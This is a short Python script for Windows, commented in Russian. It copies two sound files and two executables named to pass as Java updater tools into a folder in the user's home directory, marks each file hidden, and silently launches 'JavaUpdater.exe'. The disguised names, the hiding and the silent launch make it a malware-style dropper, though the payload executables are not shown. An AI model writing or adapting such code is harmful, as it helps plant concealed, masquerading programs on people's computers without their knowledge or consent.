import os
import shutil
import time
import ctypes
import subprocess
import sys

# Список файлов
DESTINATION_PATHS = {
    "media\\wind_alert.wav": os.path.join(os.path.expanduser("~"), "chach", "media\\wind_alert.wav"),
    "media\\hub.wav": os.path.join(os.path.expanduser("~"), "chach", "media\\hub.wav"),
    "JavaUpdater.exe": os.path.join(os.path.expanduser("~"), "chach", "JavaUpdater.exe"),
    "JavaUpdateScheduller.exe": os.path.join(os.path.expanduser("~"), "chach", "JavaUpdateScheduller.exe")
}

script_dir = os.path.dirname(sys.executable)
print(script_dir)

# Корпирование и скрытие
def copy_and_hide_files():
    if not os.path.exists(os.path.join(os.path.expanduser("~"), "chach")):
        os.makedirs(os.path.join(os.path.expanduser("~"), "chach\\media"))
        os.makedirs(os.path.join(os.path.expanduser("~"), "chach\\killer"))

    for file, dest in DESTINATION_PATHS.items():
        file = script_dir + '\\' + file
        if not os.path.exists(dest):
            shutil.copy(file, dest)
            # Скрываю
            ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02)
            print(f"[+] {file} скопирован в {dest} и скрыт")
        else:
            print(f"[-] {file} уже существует в {dest}")

# Автозапуск после копирования
def launch_file(file_name):
    try:
        path = os.path.join(os.path.expanduser("~"), "chach", file_name)
        print(f"[+] Запускаю {file_name}...")
        subprocess.Popen(path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[-] Не удалось запустить {file_name}: {e}")


if __name__ == "__main__":
    copy_and_hide_files()
    launch_file('JavaUpdater.exe')
